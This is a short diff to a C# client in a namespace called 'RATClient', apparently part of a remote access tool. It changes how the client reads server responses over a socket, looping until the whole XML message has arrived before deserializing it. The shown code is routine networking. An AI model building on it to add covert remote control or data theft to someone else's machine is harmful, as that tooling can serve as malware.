@@ -2,6 +2,8 @@
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
+using System.Reflection;
+using System.Runtime.InteropServices.ComTypes;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Xml;
@@ -119,9 +121,15 @@ namespace RATClient
                 nstream.Write(sendBytes, 0, sendBytes.Length);
                 nstream.Flush();
                 byte[] message = new byte[sock.ReceiveBufferSize + 1];
-                int bytesRead = nstream.Read(message, 0, Convert.ToInt32(sock.ReceiveBufferSize));
-                if (bytesRead == 0) return;
-                Response r = DeserializeFromXml<Response>(Encoding.ASCII.GetString(message, 0, bytesRead));
+                StringBuilder sb = new StringBuilder();
+                int bytesRead = 0;
+                do
+                {
+                    bytesRead = nstream.Read(message, 0, Convert.ToInt32(sock.ReceiveBufferSize));
+                    sb.Append(Encoding.ASCII.GetString(message, 0, bytesRead));
+                } while (bytesRead == sock.ReceiveBufferSize);
+                if (sb.ToString() == string.Empty) return;
+                Response r = DeserializeFromXml<Response>(sb.ToString());
                 if (r.Type == "Message") { Console.WriteLine(r.Msg); }
                 else if (r.Type == "Data")
                 {
